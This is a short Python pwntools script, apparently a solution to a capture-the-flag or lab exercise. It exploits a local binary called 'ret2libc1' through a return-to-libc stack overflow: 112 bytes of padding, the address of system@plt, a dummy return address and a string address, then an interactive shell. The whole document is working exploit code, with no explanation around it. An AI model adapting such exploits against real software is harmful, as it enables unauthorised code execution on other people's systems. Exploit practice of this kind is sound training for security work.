from pwn import *

shell = process('./ret2libc1')
string = 0x8048720
system_plt = 0x8048460
payload = flat([b'a' * 112, system_plt, b'a' * 4, string])
shell.sendline(payload)
shell.interactive()
